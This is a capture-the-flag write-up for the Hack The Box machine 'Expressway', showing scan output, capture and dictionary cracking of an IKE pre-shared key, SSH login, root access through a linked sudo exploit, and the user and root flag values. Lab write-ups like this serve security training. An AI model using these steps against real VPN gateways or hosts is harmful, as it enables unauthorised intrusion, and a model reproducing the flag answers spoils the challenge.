---
layout: post
title: "HTB Linux Easy: Expressway"
description: "Expressway is an Easy rated Linux machine on HTB."
categories: [CTF,HTB]
tags: [Linux,Easy]
author: g
---

## Nmap Scan
```bash
sudo nmap -sU 10.129.170.75 -p500 -Pn -sCV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 13:48 CEST
Nmap scan report for 10.129.170.75
Host is up.

PORT    STATE SERVICE VERSION
500/udp open  isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port500-UDP:V=7.95%I=7%D=9/21%Time=68CFE614%P=x86_64-pc-linux-gnu%r(IPS
SF:EC_START,9C,"1'\xfc\xb08\x10\x9e\x895\xb1\|\xab\xd4\x1a\xce\x91\x01\x10
SF:\x02\0\0\0\0\0\0\0\0\x9c\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0
SF:\x01\0\0\0\x20\x01\x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x8
SF:0\x03\0\x03\x80\x0b\0\x01\x80\x0c\x0e\x10\r\0\0\x0c\t\0&\x89\xdf\xd6\xb
SF:7\x12\r\0\0\x14\xaf\xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0\r\0\0
SF:\x18@H\xb7\xd5n\xbc\xe8\x85%\xe7\xde\x7f\0\xd6\xc2\xd3\x80\0\0\0\0\0\0\
SF:x14\x90\xcb\x80\x91>\xbbin\x08c\x81\xb5\xecB{\x1f");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.35 seconds
```


### UDP IKE VPN (Port 500)
Retrieve the PSK: [Guide](https://routezero.security/2025/04/06/ike-cheat-sheet-for-pentration-testers/)
```bash
ike-scan --showbackoff -M -A -P -R 10.129.170.75
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.170.75	Aggressive Mode Handshake returned
	HDR=(CKY-R=96204982ac54257b)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

IKE Backoff Patterns:

IP Address	No.	Recv time		Delta Time
10.129.170.75	1	1758455621.159309	0.000000
10.129.170.75	2	1758455625.641889	4.482580
10.129.170.75	3	1758455632.503113	6.861224
10.129.170.75	4	1758455645.376711	12.873598
10.129.170.75	Implementation guess: UNKNOWN

Some IKE implementations found have unknown backoff fingerprints
If you know the implementation name, and the pattern is reproducible, you
are encouraged to submit the pattern and implementation details
through the github repository at https://github.com/royhills/ike-scan
IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
42aef070db3c0276bf1e8bbab3f36123d9526d50e3ec50f5bd626d5bbf3c9909fc41a5d8a6b72a134ec8a92618b7776c6b300a7141cf426b459674cd8dfb90a7e617a31975e5a8001973bf49de05045682212ead9b555d97b1b1a313575f5d93fe81d2beb5b90efc73b3918c8d28c68259810a155f625d46af86ba9863c59e62:7f6658f14e7958ed6c224d0f166ab6b99b7655e32623d66b8fd4a8b2cd825b6acca6c8ca8d9f1876a850fb3dbe6055a3d1aed63f89b3b5cecf98e73b276f54d4cf85d31c6189b01285a327ba3be8480073fcf726135859cd44d1c5db3cd6e338c9e36ae8c529eddcf116fbd1b94f983760cda6369f92322f9e94ecbc94b6e714:96204982ac54257b:24334954605d5d3b:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:d001ec0df41445d90aacac711a2ce7c6021213c1:b0c56184c7b3f54aa195614602352c3edc65993022d5f02d894864482cc5c4c6:d85e16bd3fb2f4974e761e1e744fbd3ef97d1ba4
Ending ike-scan 1.9.6: 1 hosts scanned in 84.406 seconds (0.01 hosts/sec).  1 returned handshake; 0 returned notify
```

Crack the PSK using Rockyou:
```bash
psk-crack hash -d /usr/share/wordlists/rockyou.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash d85e16bd3fb2f4974e761e1e744fbd3ef97d1ba4
Ending psk-crack: 8045040 iterations in 4.736 seconds (1698805.86 iterations/sec)
```

SSH as the ike user:
```bash
ssh ike@10.129.170.75
ike@10.129.170.75's password: 
Last login: Sun Sep 21 12:58:39 BST 2025 from 10.10.14.226 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep 21 12:58:43 2025 from 10.10.14.226
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

User.txt: `3ad1a6dc5eca8bfc6a53349e5f60289f`
```bash
ike@expressway:~$ cat user.txt
3ad1a6dc5eca8bfc6a53349e5f60289f
```


### Privilege Escalation
The sudo version (1.9.17) is vulnerable to a privilege escalation vulnerability: [Link](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/).
```bash
ike@expressway:/tmp$ chmod +x privesc.sh
ike@expressway:/tmp$ ./privesc.sh
woot!
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

Root.txt: `7052cfc48707a0579ad144062310d307`
```bash
root@expressway:/root# cat root.txt
7052cfc48707a0579ad144062310d307
```
